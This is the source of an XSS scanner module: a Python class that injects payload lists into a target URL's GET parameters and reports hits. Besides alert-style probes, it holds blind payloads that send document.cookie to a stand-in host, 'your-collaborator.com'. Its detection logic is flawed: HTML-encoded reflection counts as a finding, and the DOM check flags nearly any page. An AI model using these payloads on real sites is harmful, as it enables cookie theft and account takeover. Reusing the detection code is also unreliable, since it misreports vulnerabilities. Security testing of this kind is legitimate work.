#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class XSSScanner:
    def __init__(self, target, verbose=False, threads=10):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.threads = threads
        self.results = []
        
        # Reflected XSS payloads
        self.reflected_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "<body/onload=alert(1)>",
            "<input/onfocus=alert(1)>",
            "'><script>alert(1)</script>",
            "';alert(1)//",
            "<iframe src=javascript:alert(1)>",
            "<math><maction actiontype=statusline# xss=alert(1)>"
        ]
        
        # DOM-Based XSS payloads
        self.dom_payloads = [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "javascript:alert(document.domain)",
            "<svg/onload=alert(document.cookie)>",
            "';alert(document.domain)//",
            "<iframe src=javascript:alert(document.domain)>"
        ]
        
        # Blind XSS payloads (use with collaborator or external server)
        self.blind_payloads = [
            "<script>fetch('https://your-collaborator.com/'+document.cookie)</script>",
            "<img src=x onerror=fetch('https://your-collaborator.com/'+document.cookie)>",
            "<script>new Image().src='https://your-collaborator.com/'+document.cookie</script>"
        ]

    def extract_params(self):
        parsed = urlparse(self.target)
        if not parsed.query:
            return {}
        return parse_qs(parsed.query)

    def build_url(self, params):
        parsed = urlparse(self.target)
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def test_reflected(self, param, payload):
        """Test for reflected XSS"""
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            # Check if payload is reflected (plain or encoded)
            if payload in resp.text or payload.replace('<', '&lt;').replace('>', '&gt;') in resp.text:
                result = {
                    "type": "reflected",
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "status": resp.status_code
                }
                self.results.append(result)
                log_success(f"🔥 Reflected XSS found on {param} with payload: {payload}")
                return True
            elif self.verbose:
                log_debug(f"Param {param} with {payload} -> Not reflected")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error: {e}")
        return False

    def test_dom_based(self, param, payload):
        """Test for DOM-Based XSS (simplified check)"""
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            # DOM-Based XSS is harder to detect via simple HTTP responses
            # We check for typical DOM indicators
            dom_indicators = ['document.', 'window.', 'location.', 'innerHTML', 'outerHTML', 'eval(']
            found_indicators = [ind for ind in dom_indicators if ind in resp.text]
            if found_indicators:
                result = {
                    "type": "dom_based",
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "indicators": found_indicators
                }
                self.results.append(result)
                log_success(f"🔥 Potential DOM-Based XSS on {param} with payload: {payload}")
                return True
            elif self.verbose:
                log_debug(f"Param {param} with {payload} -> No DOM indicators")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error: {e}")
        return False

    def test_blind(self, param, payload):
        """Test for Blind XSS (requires collaborator)"""
        # This is a placeholder - blind XSS requires an external server
        # User needs to set up their own collaborator or use a service like xss.report
        log_info(f"Blind XSS requires an external collaborator. Payload: {payload}")
        log_info("You can use services like: https://xsshunter.com or https://cors-anywhere.herokuapp.com")
        return False

    def run(self):
        log_info(f"Starting XSS scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning("No GET parameters found. XSS scan works best with parameters like ?q=test")
            return {"target": self.target, "scan_type": "xss", "vulnerabilities": []}

        log_info(f"Testing {len(params)} parameter(s) with multiple payloads...")
        
        for param in params.keys():
            log_info(f"Testing parameter: {param}")
            
            # 1. Reflected XSS
            log_info("  Testing Reflected XSS...")
            for payload in self.reflected_payloads:
                if self.test_reflected(param, payload):
                    break
            
            # 2. DOM-Based XSS
            log_info("  Testing DOM-Based XSS...")
            for payload in self.dom_payloads[:3]:
                if self.test_dom_based(param, payload):
                    break
            
            # 3. Blind XSS (placeholder)
            if self.verbose:
                log_info("  Blind XSS requires external collaborator. Skipping...")

        log_success(f"XSS scan completed. Found {len(self.results)} vulnerabilities.")
        return {
            "target": self.target,
            "scan_type": "xss",
            "total_params": len(params),
            "vulnerable_count": len(self.results),
            "vulnerabilities": self.results
        }
